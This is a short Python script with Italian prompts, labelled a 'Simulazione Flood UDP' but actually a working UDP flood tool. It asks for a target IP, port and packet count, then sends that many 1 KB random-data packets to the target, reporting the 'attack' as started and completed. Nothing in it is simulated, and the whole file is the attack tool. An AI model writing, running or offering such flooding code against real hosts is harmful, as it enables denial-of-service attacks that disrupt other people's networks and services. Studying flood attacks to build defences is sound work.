import socket
import random
import ipaddress

def valida_ip(ip_str):
    ipaddress.ip_address(ip_str)

def valida_porta(porta_str):
    porta = int(porta_str)
    if not (1 <= porta <= 65535):
        raise ValueError

def valida_pacchetti(pacchetti_str):
    pacchetti = int(pacchetti_str)
    if pacchetti <= 0:
        raise ValueError

def flood_udp(ip_bersaglio, porta_bersaglio, numero_pacchetti):
    socket_udp = None
    try:
        porta_bersaglio = int(porta_bersaglio)
        numero_pacchetti = int(numero_pacchetti)
        
        socket_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        dati_casuali = random.randbytes(1024)
        
        print(f"\nInizio attacco su {ip_bersaglio}:{porta_bersaglio}...")
        
        for _ in range(numero_pacchetti):
            socket_udp.sendto(dati_casuali, (ip_bersaglio, porta_bersaglio))
            
        print(f"Attacco completato. Inviati {numero_pacchetti} pacchetti.")
    except Exception as e:
        print(f"\nAttacco fallito. Errore: {e}")
    finally:
        if socket_udp:
            socket_udp.close()

print("--- Simulazione Flood UDP ---")

while True:
    try:
        ip_bersaglio = input("Inserisci l'IP: ")
        valida_ip(ip_bersaglio)
        break
    except ipaddress.AddressValueError:
        print("IP non valido. Riprova.")

while True:
    try:
        porta_bersaglio = input("Inserisci la porta (1-65535): ")
        valida_porta(porta_bersaglio)
        break
    except ValueError:
        print("Porta non valida. Inserisci un numero tra 1 e 65535.")

while True:
    try:
        numero_pacchetti = input("Quanti pacchetti vuoi inviare?: ")
        valida_pacchetti(numero_pacchetti)
        break
    except ValueError:
        print("Numero di pacchetti non valido. Inserisci un numero maggiore di 0.")

flood_udp(ip_bersaglio, porta_bersaglio, numero_pacchetti)